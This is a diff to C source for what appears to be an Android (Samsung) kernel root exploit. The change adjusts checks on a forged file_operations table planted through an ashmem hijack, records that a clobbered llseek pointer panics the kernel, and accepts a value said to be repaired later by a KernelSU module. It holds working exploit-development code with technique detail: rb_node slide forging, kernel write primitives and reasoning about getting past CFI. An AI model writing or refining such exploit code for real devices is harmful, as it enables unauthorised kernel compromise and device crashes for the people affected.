@@ -88,7 +88,7 @@ static int audit_fake_fops_table(int fd) {
       (unsigned long long)table[FOPS_READ_OFF / sizeof(uint64_t)],
       (unsigned long long)table[FOPS_WRITE_OFF / sizeof(uint64_t)]);
   /* ->llseek is checked separately because the slide route CLOBBERS it, by
-   * design, and that is not repairable.
+   * design, and the payload cannot repair it.
    *
    * The slide forges an rb_node with __rb_parent_color = fake_fops and
    * rb_right = ashmem_misc.fops. The hijack itself is the primary effect:
@@ -99,29 +99,41 @@ static int audit_fake_fops_table(int fd) {
    * always leaves ashmem_misc.fops there.
    *
    * pc MUST be fake_fops for the primary write to land correctly, so the clobber
-   * is unavoidable with this route. It is also benign in practice: nothing ever
-   * lseek()s this fd (the exploit only pread/pwrite/ioctl it), which is why the
-   * exploit reached root historically with this exact value in place. An
-   * AAR-based repair is impossible regardless - writes into our own reclaim
-   * page return success and change nothing (measured; see put_fake_fops_table).
+   * is unavoidable with this route. It is NOT benign: the first lseek() on a
+   * post-hijack ashmem fd jumps to that .data address and IABTs the kernel
+   * (proven 2026-10-11: pc = ashmem_misc+0x10 via __arm64_sys_lseek on a
+   * system_server binder thread during IME bringup; the standard
+   * ASharedMemory_getSize lseek(fd,0,SEEK_END) idiom). An AAR-based repair is
+   * impossible regardless - the slide only writes data pointers and the
+   * configfs writer reaches .data only, while the slot needs a text address in
+   * a slab page. The repair is performed by the KSU module at init
+   * (compat/samsung_ashmem.c writes the genuine ashmem_llseek with a plain
+   * kernel write), which is why a supervisor retry AFTER a KSU load observes
+   * the fixed value.
    *
-   * So accept either value: noop_llseek if the slide has not run yet, or
-   * ashmem_misc.fops once it has. Anything else means the table is not ours. */
+   * So accept three values: noop_llseek if the slide has not run yet,
+   * ashmem_misc.fops once it has and KSU has not repaired it yet, or the
+   * genuine ashmem_llseek once KSU repaired it. Anything else means the table
+   * is not ours. */
   uint64_t got_llseek = table[FOPS_LLSEEK_OFF / sizeof(uint64_t)];
   uint64_t want_llseek_slid = data_addr(ASHMEM_MISC_FOPS);
   uint64_t want_llseek_built = text_addr(NOOP_LLSEEK);
-  if (got_llseek != want_llseek_slid && got_llseek != want_llseek_built) {
+  uint64_t want_llseek_fixed = text_addr(ASHMEM_LLSEEK_OFF);
+  if (got_llseek != want_llseek_slid && got_llseek != want_llseek_built &&
+      got_llseek != want_llseek_fixed) {
     pr_warning("cfi fake fops llseek mismatch got=%016llx slid=%016llx "
-               "built=%016llx\n",
+               "built=%016llx fixed=%016llx\n",
                (unsigned long long)got_llseek,
                (unsigned long long)want_llseek_slid,
-               (unsigned long long)want_llseek_built);
+               (unsigned long long)want_llseek_built,
+               (unsigned long long)want_llseek_fixed);
     return 0;
   }
   rmg_diag("LLSEEK audit ok value=%016llx (%s)\n",
            (unsigned long long)got_llseek,
-           got_llseek == want_llseek_slid ? "post-slide clobber, expected"
-                                         : "build-time noop_llseek");
+           got_llseek == want_llseek_slid  ? "post-slide clobber, expected"
+           : got_llseek == want_llseek_fixed ? "KSU-repaired ashmem_llseek"
+                                             : "build-time noop_llseek");
   for (size_t i = 0; i < sizeof(expected) / sizeof(expected[0]); ++i) {
     uint64_t got = table[expected[i].off / sizeof(uint64_t)];
     if (got != expected[i].value) {
@@ -417,6 +429,7 @@ __attribute__((visibility("default"))) int futex_poison_probe(int fd) {
 #endif
 int repair_fake_fops_llseek(int fd) {
   uint64_t llseek = text_addr(NOOP_LLSEEK);
+  uint64_t fixed = text_addr(ASHMEM_LLSEEK_OFF);
   uint64_t before = 0;
   uint64_t after = 0;
   uintptr_t slot = fake_fops + FOPS_LLSEEK_OFF;
@@ -429,9 +442,15 @@ int repair_fake_fops_llseek(int fd) {
   if (before_rd != (ssize_t)sizeof(before)) {
     return 0;
   }
-  pr_info("cfi llseek before=%016llx want=%016llx slot=%016zx\n",
-          (unsigned long long)before, (unsigned long long)llseek, slot);
+  pr_info("cfi llseek before=%016llx want=%016llx fixed=%016llx slot=%016zx\n",
+          (unsigned long long)before, (unsigned long long)llseek,
+          (unsigned long long)fixed, slot);
   if (before == llseek) {
+    return 1;
+  }
+  if (before == fixed) {
+    rmg_diag("LLSEEK already KSU-repaired to ashmem_llseek=%016llx; table safe\n",
+             (unsigned long long)before);
     return 1;
   }
   /* The post-slide value is ashmem_misc.fops, and that is EXPECTED, not damage.
@@ -444,17 +463,23 @@ int repair_fake_fops_llseek(int fd) {
    * fake_fops for the primary write to be correct, so this clobber is inherent to
    * the route and cannot be designed out.
    *
-   * It is benign because nothing lseek()s this fd: the exploit only pread,
-   * pwrite and ioctl it, which is why the exploit reached root with this exact
-   * value in place. An AAR repair is impossible in any case - writes into our own
-   * reclaim page return success and change nothing (measured; three writes, three
+   * It is NOT benign: any lseek() on a post-hijack ashmem fd jumps to that
+   * non-executable .data address and panics the kernel (proven 2026-10-11).
+   * The exploit itself only pread/pwrite/ioctl its own fd, which is why root
+   * was reached historically with this value in place - but the first
+   * unrelated lseek (e.g. ASharedMemory_getSize during IME bringup) kills the
+   * device. An AAR repair is impossible in any case - the slide only writes
+   * data pointers and the configfs writer reaches .data only, while this slot
+   * needs a text address in a slab page (measured: three writes, three
    * unchanged reads, confirmed by two independent readers).
    *
-   * So this is a report, not a repair. audit_fake_fops_table() is what actually
-   * validates the slot, and it accepts both legitimate values. */
+   * The repair happens in the KSU module at init (compat/samsung_ashmem.c),
+   * which performs a plain kernel write of the genuine ashmem_llseek. Until
+   * then this function is a report, not a repair: it returns success so root
+   * can proceed to the stage that loads KSU. */
   if (before == data_addr(ASHMEM_MISC_FOPS)) {
     rmg_diag("LLSEEK holds the post-slide clobber ashmem_misc.fops=%016llx; "
-             "benign (nothing lseeks this fd) and not repairable via the AAR\n",
+             "proceeding to root so KSU init can repair it (see samsung_ashmem)\n",
              (unsigned long long)before);
     return 1;
   }
